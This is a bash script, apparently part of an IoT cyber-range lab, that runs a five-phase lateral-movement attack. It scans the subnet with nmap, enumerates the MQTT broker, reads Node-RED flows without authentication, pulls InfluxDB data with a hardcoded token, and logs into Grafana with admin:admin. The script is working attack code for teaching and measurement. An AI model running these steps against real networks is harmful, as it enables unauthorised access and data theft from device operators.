#!/bin/bash
# ──────────────────────────────────────────────────────────────────────────────
# 05_lateral_movement.sh - Lateral Movement Attack
#
# Scenario 5: Post-compromise lateral movement across the flat IoT network.
#
# Attack description:
#   Having compromised a sensor device (credentials obtained via Scenario 1
#   eavesdropping or Scenario 4 brute force), the attacker uses the flat
#   network topology to reach other services in the infrastructure.
#
#   In the insecure environment, all containers share the same network
#   segment (172.20.0.0/24) with no segmentation or firewall rules.
#   The attacker can reach the broker, Node-RED admin UI, InfluxDB API,
#   and Grafana from any compromised device.
#
#   Attack phases:
#       1. Network reconnaissance (nmap scan of the entire subnet)
#       2. Broker enumeration (list connected clients and topics)
#       3. Node-RED admin UI access (no authentication required)
#       4. InfluxDB data exfiltration (unauthenticated API access)
#       5. Grafana admin access (default credentials)
#
# Expected result (insecure environment):
#   - Full network visibility from compromised sensor
#   - Access to all services without authentication
#   - Complete data exfiltration from InfluxDB
#   - Admin access to Node-RED and Grafana
#
# Metrics collected:
#   - Services discovered
#   - Services accessed successfully
#   - Data records exfiltrated
#   - Time to full infrastructure compromise
#
# MITRE ATT&CK for ICS:
#   - T0812: Default Credentials
#   - T0842: Network Sniffing
#   - T0846: Remote System Discovery
#   - T0852: Screen Capture
# ──────────────────────────────────────────────────────────────────────────────

BROKER_HOST="${BROKER_HOST:-172.20.0.20}"
NODERED_HOST="${NODERED_HOST:-172.20.0.31}"
INFLUXDB_HOST="${INFLUXDB_HOST:-172.20.0.30}"
GRAFANA_HOST="${GRAFANA_HOST:-172.20.0.32}"
SUBNET="${SUBNET:-172.20.0.0/24}"
OUTPUT_DIR="/attacker/results"
OUTPUT_FILE="$OUTPUT_DIR/05_lateral_movement_$(date +%Y%m%d_%H%M%S).log"

mkdir -p "$OUTPUT_DIR"

SERVICES_DISCOVERED=0
SERVICES_ACCESSED=0
DATA_EXFILTRATED=0

log() {
    echo "[$(date +%H:%M:%S)] $*" | tee -a "$OUTPUT_FILE"
}

echo "=============================================="
echo " SCENARIO 5 - Lateral Movement Attack"
echo "=============================================="
echo " Subnet        : $SUBNET"
echo " Broker        : $BROKER_HOST"
echo " Node-RED      : $NODERED_HOST:1880"
echo " InfluxDB      : $INFLUXDB_HOST:8086"
echo " Grafana       : $GRAFANA_HOST:3000"
echo " Output        : $OUTPUT_FILE"
echo "=============================================="
echo ""

# ── Phase 1: Network Reconnaissance ───────────────────────────────────────
log "[*] Phase 1: Network reconnaissance — scanning subnet $SUBNET"
log ""

nmap -sn "$SUBNET" --open 2>/dev/null | tee -a "$OUTPUT_FILE" | grep -E "Nmap scan|Host is up" | while read -r line; do
    log "[+] $line"
    SERVICES_DISCOVERED=$((SERVICES_DISCOVERED + 1))
done

log ""
log "[*] Port scan on discovered hosts..."
nmap -p 1883,1880,8086,3000 "$SUBNET" --open 2>/dev/null | tee -a "$OUTPUT_FILE"

log ""

# ── Phase 2: Broker Enumeration ───────────────────────────────────────────
log "[*] Phase 2: MQTT broker enumeration"
log "[*] Subscribing to \$SYS topic tree (broker statistics)..."
log ""

timeout 5 mosquitto_sub \
    -h "$BROKER_HOST" \
    -p 1883 \
    -t "\$SYS/#" \
    -v 2>/dev/null | while read -r line; do
    log "[BROKER] $line"
    SERVICES_DISCOVERED=$((SERVICES_DISCOVERED + 1))
done

log ""

# ── Phase 3: Node-RED Admin UI Access ─────────────────────────────────────
log "[*] Phase 3: Attempting Node-RED admin UI access (no auth required)"
log "[*] Target: http://$NODERED_HOST:1880"
log ""

NODERED_RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" \
    --connect-timeout 5 \
    "http://$NODERED_HOST:1880" 2>/dev/null)

if [ "$NODERED_RESPONSE" = "200" ]; then
    SERVICES_ACCESSED=$((SERVICES_ACCESSED + 1))
    log "[+] SUCCESS: Node-RED admin UI accessible (HTTP $NODERED_RESPONSE)"
    log "[!] Attacker can view and modify all IoT data flows"

    # Try to access flows API
    FLOWS_RESPONSE=$(curl -s --connect-timeout 5 \
        "http://$NODERED_HOST:1880/flows" 2>/dev/null)

    if [ -n "$FLOWS_RESPONSE" ]; then
        log "[+] Node-RED flows API accessible — flow configuration exposed"
        echo "$FLOWS_RESPONSE" | python3 -c "
import sys, json
try:
    flows = json.load(sys.stdin)
    print(f'    Flows found: {len(flows)}')
    for f in flows:
        if f.get('type') not in ['tab', 'mqtt-broker', 'influxdb']:
            print(f'    - [{f.get(\"type\")}] {f.get(\"name\", \"unnamed\")}')
except:
    print('    Could not parse flows response')
" 2>/dev/null | tee -a "$OUTPUT_FILE"
    fi
else
    log "[-] Node-RED not accessible (HTTP $NODERED_RESPONSE)"
fi

log ""

# ── Phase 4: InfluxDB Data Exfiltration ───────────────────────────────────
log "[*] Phase 4: InfluxDB data exfiltration"
log "[*] Target: http://$INFLUXDB_HOST:8086"
log ""

# Check InfluxDB health
INFLUX_HEALTH=$(curl -s --connect-timeout 5 \
    "http://$INFLUXDB_HOST:8086/health" 2>/dev/null)

if echo "$INFLUX_HEALTH" | grep -q '"status":"pass"'; then
    SERVICES_ACCESSED=$((SERVICES_ACCESSED + 1))
    log "[+] SUCCESS: InfluxDB is accessible and healthy"

    # Exfiltrate sensor data using known token (obtained via Node-RED flows access)
    log "[*] Exfiltrating sensor data using token found in Node-RED flows..."

    QUERY='from(bucket:"sensors") |> range(start: -1h) |> limit(n: 100)'

    EXFIL_DATA=$(curl -s --connect-timeout 5 \
        -H "Authorization: Token insecure-token-12345" \
        -H "Content-Type: application/vnd.flux" \
        "http://$INFLUXDB_HOST:8086/api/v2/query?org=iot-cyberrange" \
        --data "$QUERY" 2>/dev/null)

    if [ -n "$EXFIL_DATA" ]; then
        DATA_RECORDS=$(echo "$EXFIL_DATA" | wc -l)
        DATA_EXFILTRATED=$((DATA_EXFILTRATED + DATA_RECORDS))
        log "[+] Data exfiltration successful: $DATA_RECORDS records retrieved"
        log "[!] Full sensor history accessible to attacker"

        # Save exfiltrated data
        EXFIL_FILE="$OUTPUT_DIR/exfiltrated_data_$(date +%Y%m%d_%H%M%S).csv"
        echo "$EXFIL_DATA" > "$EXFIL_FILE"
        log "[+] Exfiltrated data saved to: $EXFIL_FILE"
    else
        log "[-] Could not exfiltrate data from InfluxDB"
    fi
else
    log "[-] InfluxDB not accessible"
fi

log ""

# ── Phase 5: Grafana Admin Access ─────────────────────────────────────────
log "[*] Phase 5: Grafana admin access with default credentials"
log "[*] Target: http://$GRAFANA_HOST:3000"
log ""

GRAFANA_RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" \
    --connect-timeout 5 \
    "http://$GRAFANA_HOST:3000" 2>/dev/null)

if [ "$GRAFANA_RESPONSE" = "200" ]; then
    SERVICES_ACCESSED=$((SERVICES_ACCESSED + 1))
    log "[+] SUCCESS: Grafana accessible (HTTP $GRAFANA_RESPONSE)"

    # Try admin API with default credentials
    GRAFANA_API=$(curl -s --connect-timeout 5 \
        -u "admin:admin" \
        "http://$GRAFANA_HOST:3000/api/org" 2>/dev/null)

    if echo "$GRAFANA_API" | grep -q '"id"'; then
        log "[+] Grafana admin API accessible with default credentials (admin:admin)"
        log "[!] Attacker has full admin access to monitoring dashboard"

        ORG_NAME=$(echo "$GRAFANA_API" | python3 -c "
import sys, json
try:
    data = json.load(sys.stdin)
    print(f'    Organization: {data.get(\"name\", \"unknown\")}')
except:
    pass
" 2>/dev/null)
        log "$ORG_NAME" | tee -a "$OUTPUT_FILE"
    fi
else
    log "[-] Grafana not accessible (HTTP $GRAFANA_RESPONSE)"
fi

log ""

# ── Summary ───────────────────────────────────────────────────────────────
echo ""
echo "=============================================="
echo " ATTACK SUMMARY - Scenario 5"
echo "=============================================="
echo " Services discovered : $SERVICES_DISCOVERED"
echo " Services accessed   : $SERVICES_ACCESSED"
echo " Records exfiltrated : $DATA_EXFILTRATED"
echo " Output saved to     : $OUTPUT_FILE"
echo "=============================================="